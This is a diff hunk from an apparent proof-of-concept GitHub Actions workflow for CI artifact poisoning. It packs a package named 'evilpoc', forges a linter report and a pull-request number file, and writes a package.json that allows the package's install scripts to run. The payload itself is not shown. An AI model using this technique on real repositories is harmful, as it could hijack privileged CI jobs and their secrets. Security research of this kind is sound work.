@@ -37,7 +37,7 @@ jobs:
           EOF
           (cd evilpoc && npm pack --pack-destination ..)
           printf 'FORGED REPORT - artifact from attacker workflow\n' > linter-report.txt
-          printf '2' > pr-number.txt
+          printf '1' > pr-number.txt
           cat > package.json <<'EOF'
           {"name":"poc-root","version":"1.0.0","dependencies":{"evilpoc":"file:./evilpoc-1.0.0.tgz"},"allowScripts":{"evilpoc":true}}
           EOF
